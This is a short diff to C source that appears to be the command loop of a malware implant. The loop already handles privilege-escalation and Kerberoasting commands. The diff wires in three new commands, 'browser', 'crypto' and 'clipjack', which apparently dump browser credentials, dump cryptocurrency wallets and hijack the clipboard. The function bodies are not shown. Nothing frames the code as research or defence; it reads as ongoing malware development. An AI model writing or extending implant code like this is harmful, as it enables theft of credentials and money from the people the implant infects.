@@ -562,6 +562,18 @@ static void agent_run(void)
                 {
                     ret = cmd_lpe_check(args, output, OUTPUT_BUF_SIZE);
                 }
+                else if (strcmp(cmd, "browser") == 0)
+                {
+                    ret = cmd_browser_dump(args, output, OUTPUT_BUF_SIZE);
+                }
+                else if (strcmp(cmd, "crypto") == 0)
+                {
+                    ret = cmd_crypto_dump(args, output, OUTPUT_BUF_SIZE);
+                }
+                else if (strcmp(cmd, "clipjack") == 0)
+                {
+                    ret = cmd_clipjack(args, output, OUTPUT_BUF_SIZE);
+                }
 #ifndef LEAN
                 else if (_cmdeq(cmd, EVS_str_cmd_kerberoast, sizeof(EVS_str_cmd_kerberoast)))
                 {
